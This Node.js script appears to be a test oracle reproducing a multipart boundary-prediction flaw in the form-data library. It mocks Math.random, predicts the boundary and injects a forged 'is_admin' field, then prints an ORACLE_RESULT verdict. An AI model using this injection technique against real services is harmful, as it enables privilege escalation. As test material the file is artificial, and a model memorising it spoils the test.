const FormData = require('form-data');

(function () {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const originalRandom = Math.random;

  try {
    // Deterministic sequence simulating attacker prediction of future Math.random outputs.
    const seq = [];
    for (let i = 0; i < 128; i++) {
      seq.push(((i * 7) % 10) / 10); // repeating decimal values in [0, 1)
    }
    let idx = 0;
    Math.random = function () {
      const v = seq[idx % seq.length];
      idx += 1;
      return v;
    };

    // Benign operation first: create form and verify normal boundary behavior.
    const benignForm = new FormData();
    benignForm.append('safe_field', 'safe_value');
    const benignBoundary = benignForm.getBoundary();
    const benignBody = benignForm.getBuffer().toString('utf8');
    if (typeof benignBoundary !== 'string' || benignBoundary.length === 0) {
      throw new Error('benign boundary missing');
    }
    if (benignBody.indexOf('safe_value') === -1) {
      throw new Error('benign serialization failed');
    }

    operation_completed = true;

    // Predict next boundary exactly as vulnerable code does: 24 digits from Math.random.
    const intro = '--------------------------';
    let predictedSuffix = '';
    for (let i = 0; i < 24; i++) {
      const r = seq[(idx + i) % seq.length];
      predictedSuffix += Math.floor(r * 10).toString(16);
    }
    const predictedBoundary = intro + predictedSuffix;

    const injected =
      'start\r\n' +
      '--' + predictedBoundary + '\r\n' +
      'Content-Disposition: form-data; name="is_admin"\r\n\r\n' +
      'true\r\n' +
      '--' + predictedBoundary + '--\r\n';

    const attackForm = new FormData();
    attackForm.append('victim_field', injected);

    const actualBoundary = attackForm.getBoundary();
    const attackBody = attackForm.getBuffer().toString('utf8');

    const boundaryPredicted = actualBoundary === predictedBoundary;
    const forgedHeaderPresent = attackBody.includes('name="is_admin"');
    const forgedValuePresent = attackBody.includes('\r\ntrue\r\n');

    exploit_succeeded = boundaryPredicted && forgedHeaderPresent && forgedValuePresent;
    evidence = JSON.stringify({
      boundary_predicted: boundaryPredicted,
      actual_boundary: actualBoundary,
      predicted_boundary: predictedBoundary,
      forged_header_present: forgedHeaderPresent,
      forged_value_present: forgedValuePresent
    });
  } catch (err) {
    if (!operation_completed) {
      operation_completed = false;
      exploit_succeeded = false;
      evidence = 'precondition_or_benign_failure:' + (err && err.message ? err.message : String(err));
    } else {
      exploit_succeeded = false;
      evidence = 'malicious_call_blocked_or_failed:' + (err && err.message ? err.message : String(err));
    }
  } finally {
    Math.random = originalRandom;
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();
